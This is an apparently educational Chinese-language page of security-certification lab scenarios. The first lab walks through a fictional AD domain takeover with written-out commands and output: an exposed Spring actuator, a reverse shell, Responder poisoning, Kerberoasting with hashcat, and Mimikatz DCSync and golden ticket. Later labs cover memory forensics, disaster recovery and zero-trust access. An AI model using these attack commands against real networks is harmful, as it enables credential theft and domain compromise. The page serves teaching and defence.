🧪 實做題 1 · 跨國科技企業 DMZ 外網突破至 AD 網域完全奪權 (CEH / ECSA)

🧒 高中生秒懂背景情境

案發現場：小偷如何從小職員電腦打入全公司金庫？

這家公司的網站很漂亮，但在後台忘記把「工程測試網址」關掉。駭客從小測試頁面拿到資料庫密碼進入內網，接著在辦公室區域發假廣播騙取帳號密碼，最後透過 Kerberos 票證漏洞一舉奪下全公司的網域管理員 (Domain Admin) 總鑰匙！

🏢 企業實戰拓撲環境

• 目標企業：Apex Global Tech (網域：apex.corp)
• 外網 DMZ 伺服器：198.51.100.25 (Linux Apache Tomcat / Spring Boot 客戶入口)
• 內網網域控制站 (DC)：10.0.10.5 (Windows Server 2022 DC01.apex.corp)
• 資料庫與應用伺服器：10.0.20.15 (執行 MSSQL_SVC 服務帳號)

1

步驟 1：外網情報偵察與漏洞利用 (External Recon & Initial Shell)

攻擊者針對目標外網 IP 執行 Nmap 掃描，發現 8080 端口暴露了 Spring Boot Actuator 的未授權存取端點 /actuator/env，從中提取到明文的內網資料庫連線憑證：

Kali Terminal - 外網探測 
attacker@kali:~$ curl -s http://198.51.100.25:8080/actuator/env | jq .
{
  "propertySources": [
    {
      "name": "applicationConfig: [classpath:/application.properties]",
      "properties": {
        "spring.datasource.username": { "value": "app_db_user" },
        "spring.datasource.password": { "value": "Winter2025!Secret" }
      }
    }
  ]
}

攻擊者進一步利用已知之 Spring Cloud Function RCE 漏洞 (CVE-2022-22963)，成功反彈一個 Meterpreter Reverse TCP Shell，在 DMZ 主機上取得 tomcat 使用者權限。

2

步驟 2：內網跳板穿透與 LLMNR 廣播毒化 (Pivoting & Responder)

攻擊者將 DMZ 主機作為跳板 (Pivot)，向辦公網段 10.0.10.0/24 啟動 Responder 工具。當辦公室某員工在檔案總管誤鍵入不存在的共享名稱 \\fileshare_internal 時，Windows 自動發送 LLMNR 廣播：

Responder 監聽毒化輸出
attacker@kali:~$ responder -I eth1 -wrf
[+] [LLMNR]  Poisoned answer sent to 10.0.10.82 for name fileshare_internal
[+] [SMB] NTLMv2-SSP Hash Received from 10.0.10.82:
apex.corp\j.doe::APEX:1122334455667788:A9C8D4F7E...
[+] 儲存至 logs/SMB-NTLMv2-SSP-10.0.10.82.txt

攻擊者將截獲的 Hash 丟入 Hashcat 以 rockyou.txt 字典檔離線破解，3 秒內算出員工 j.doe 的密碼為 Football2024!。

3

步驟 3：Kerberoasting 票據提取與離線密碼爆破

使用剛剛破獲的網域使用者 j.doe 憑證，攻擊者使用 Impacket 套件向網域控制站請求所有註冊了 SPN 的服務票據 (TGS)：

Impacket GetUserSPNs.py
attacker@kali:~$ python3 GetUserSPNs.py apex.corp/j.doe:Football2024! -dc-ip 10.0.10.5 -request
ServicePrincipalName: MSSQLSvc/sql01.apex.corp:1433
User: mssql_svc
$krb5tgs$23$*mssql_svc$apex.corp*$MSSQLSvc/sql01.apex.corp:1433*... [Hash Extracted]

# 使用 Hashcat 模式 13100 (Kerberos 5 TGS-REP etype 23) 離線秒殺：
attacker@kali:~$ hashcat -m 13100 krb_tgs.hash rockyou.txt
Status: Cracked!
Result: mssql_svc:SummerP@ssw0rd123
4

步驟 4：BloodHound 提權路徑分析與 Golden Ticket 奪權

透過 BloodHound 圖形化分析，發現 mssql_svc 帳號對網域群組 Domain Admins 擁有 GenericAll (完全控制權限)！攻擊者登入資料庫主機，利用 Mimikatz 執行 DCSync 導出網域核心帳號 krbtgt 的 NTLM Hash，製作黃金票據：

Mimikatz DCSync 奪取 krbtgt
mimikatz # lsadump::dcsync /domain:apex.corp /user:krbtgt
[SAM Log] User : krbtgt
NTLM : b86c52b2170327429188e44dd479a0b1

# 鍛造長達 10 年有效的偽造神級 TGT (Golden Ticket)
mimikatz # kerberos::golden /user:Administrator /domain:apex.corp /sid:S-1-5-21-254... /krbtgt:b86c52b2170327429188e44dd479a0b1 /ptt
[*] Golden Ticket for 'Administrator' successfully submitted for this current session!
🛡️ 企業 CISO 必勝防禦落地處方
  • 全面停用 LLMNR 與 NetBIOS-NS：透過網域群組原則 (GPO) 關閉廣播名稱解析，Responder 直接失效。
  • 將服務帳號改為 gMSA (群組受控服務帳號)：密碼長達 120 字元且由 Windows DC 每 30 天自動輪替，徹底粉碎 Kerberoasting 字典攻擊。
  • 實施階層式管理模型 (Tiered Administration Model)：禁止網域管理員 (Tier 0) 帳號登入一般員工主機或 DMZ 伺服器，切斷橫向移動跳板。

🔬 實做題 2 · 跨國金融機構勒索病毒事件應變與 Volatility 記憶體鑑識 (CHFI)

🧒 高中生秒懂背景情境

案發現場：電腦硬碟空空如也，病毒躲在哪裡搞破壞？

這是一種最狡猾的「隱形木馬（無檔案惡意程式）」。駭客寄了一封假的「年終獎金明細表」Word 檔，員工一打開，裡面的惡意巨集指令立刻在記憶體深處悄悄運作，甚至借屍還魂偽裝成微軟正常的系統處理程序。調查官必須在關機前把記憶體整個抽出來，在顯微鏡下抓出隱形真兇！

1

步驟 1：符合 RFC 3227 標準之記憶體傾印擷取 (Live RAM Acquisition)

鑑識調查官接獲通報後絕對不重開機、不拔電源。攜帶預先驗證過的唯讀隨身碟與 WinPmem 鑑識工具，執行實體記憶體完整傾印，並計算 SHA-256 雜湊值記錄於保管鏈表單：

CMD (Admin) - WinPmem 擷取
E:\Forensics> winpmem_mini_x64.exe -o mem_dump_case882.raw
[+] Writing 16384 MB physical memory to mem_dump_case882.raw ... Done.

E:\Forensics> certutil -hashfile mem_dump_case882.raw SHA256
SHA256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069
CertUtil: -hashfile command completed successfully.
2

步驟 2：使用 Volatility 3 繪製進程樹，鎖定異常父子進程

將記憶體鏡像拷貝回鑑識工作站，啟動 windows.pstree 檢查異常的程式呼叫關係：

Volatility 3 pstree 分析
forensic@box:~$ python3 vol.py -f mem_dump_case882.raw windows.pstree
...
* 0x82a10 4120 1820 explorer.exe
** 0x83c40 5844 4120 WINWORD.EXE          <-- 員工開啟釣魚 Office 檔案
*** 0x84d10 6112 5844 cmd.exe             <-- 異常：Word 呼叫命令提示字元！
**** 0x85e20 6340 6112 powershell.exe     <-- 執行 Base64 編碼的惡意下載腳本
***** 0x86f30 7108 6340 svchost.exe       <-- 致命疑點：svchost 居然由 powershell 啟動！

⚠️ 鑑識結論：微軟標準架構中，svchost.exe 必須由 services.exe 啟動！此處由 powershell.exe 啟動的 PID 7108 必然是進程空心化 (Process Hollowing) 偽裝的惡意程式！

3

步驟 3：使用 malfind 萃取注入代碼與 C2 惡意連線

執行 windows.malfind 掃描 PID 7108 的虛擬記憶體分頁，定位具有執行/讀寫權限的注入區塊：

Volatility 3 malfind 與 netscan
forensic@box:~$ python3 vol.py -f mem_dump_case882.raw windows.malfind --pid 7108
PID: 7108 Process: svchost.exe Address: 0x21a0000
4d 5a 90 00 03 00 00 00 ... MZ......  <-- 赫然發現隱藏的 PE 執行檔 MZ 標頭！
Protection: PAGE_EXECUTE_READWRITE

forensic@box:~$ python3 vol.py -f mem_dump_case882.raw windows.netscan | grep 7108
TCP 10.0.10.82:49812 -> 45.33.32.156:8443 (ESTABLISHED) PID: 7108 svchost.exe

調查官從記憶體成功抽出惡意 C2 中繼站 IP 45.33.32.156，立即將此 IoC (入侵指標) 推播給全公司防火牆全面阻斷回連！

🏛️ 實做題 3 · 半導體晶圓廠核心 ERP 業務衝擊分析 (BIA) 與災難復原實務 (CISSP)

🧒 高中生秒懂背景情境

商業大決策：工廠停工一小時損失 300 萬，該花多少錢買備用水電？

資安不只是阻擋駭客，更是保障「就算發生大地震，公司也不會倒閉」。這家工廠的生產線電腦一旦死機，每多停工一小時就要虧損數百萬。資安長必須拿著計算機精確算出：到底該花 500 萬租用隨時待命的「熱站 (Hot Site)」，還是花 100 萬租用兩天才能開機的「冷站 (Cold Site)」？

1

步驟 1：量化業務衝擊評估 (Quantitative BIA Data)

關鍵業務流程 停機每小時財務損失 最大容忍中斷時間 (MTD) 復原時間目標 (RTO) 復原點目標 (RPO)
晶圓製造執行系統 (MES) 新台幣 $3,500,000 / 時 2 小時 1 小時內 0 分鐘 (即時同步鏡像)
SAP ERP 財務結算 新台幣 $400,000 / 時 24 小時 8 小時內 4 小時 (定期差異備份)
公司內部知識庫 Wiki 新台幣 $5,000 / 時 7 天 72 小時 24 小時 (每日冷備份)
2

步驟 2：災難復原架構決策 (Disaster Recovery Architecture)

針對 MES 系統 (MTD = 2 小時)，絕對無法採用需要 24 小時以上才能部署硬體的冷站 (Cold Site)。CISO 團隊評估後向董事會提出雲端彈性熱備援 (Cloud Hot/Warm Hybrid) 方案：

  • 資料庫層級：跨可用區 (Multi-AZ) 同步複製，達成 RPO = 0。
  • 運算叢集層級：平常維持最小運算節點 (Warm)，監控偵測到主機房斷線 5 分鐘內自動藉由 Terraform / Kubernetes 彈性擴展 (Auto-scale) 瞬間頂替，達成 RTO = 30 分鐘。

🛡️ 實做題 4 · 跨國遠距辦公之零信任架構 (Zero Trust) IAM 條件存取實作 (SSCP)

🧒 高中生秒懂背景情境

零信任就像「最高機密金庫的保全」：絕不相信任何人，每次進門都重新安檢

以前的傳統觀念是「只要你人在公司辦公室裡面連著內網，就預設你是好人」。但如果員工的筆電在家被植入木馬，一帶回公司內網，整個公司就完了！
零信任原則 (Never Trust, Always Verify)：不管你是在總部辦公室還是在巴黎的咖啡廳，每次存取敏感資料，系統都要嚴格檢查：「你是誰？你用哪台電腦？防毒有沒有開？有沒有插實體安全金鑰？」

1

步驟 1：配置 SAML 2.0 / OIDC 現代身分聯合驗證

企業全面廢棄傳統 RADIUS/LDAP 容易遭受中間人與明文竊取的舊協定，全面導入 SAML 2.0 斷言與 OIDC (OpenID Connect) 權杖，並以 FIDO2 硬體金鑰 (YubiKey) 達成抵抗網路釣魚的無密碼 (Passwordless) 驗證。

2

步驟 2：條件式存取原則 (Conditional Access Policies) 策略矩陣

情境與遙測訊號 (Signals) 政策判定點 (PDP 判定) 政策執行點 (PEP 處置作為)
公司受控筆電 + 台北總部 IP + 正常工作時間 低風險 (Low Risk) 直接放行，單一登入 (SSO) 存取 ERP。
公司受控筆電 + 海外差旅飯店 Wi-Fi 中風險 (Medium Risk) 要求強制進行 FIDO2 硬體權杖二次驗證。
員工私人 iPad (未安裝 MDM / EDR) 不合規裝置 (Non-compliant) 只允許在瀏覽器唯讀預覽文件，禁止下載與複製。
10 分鐘前在台北登入，10 分鐘後在莫斯科登入 不可能的移動 (Impossible Travel - 高危) 立即封鎖帳號，發送重大安全事件通報 SOC。
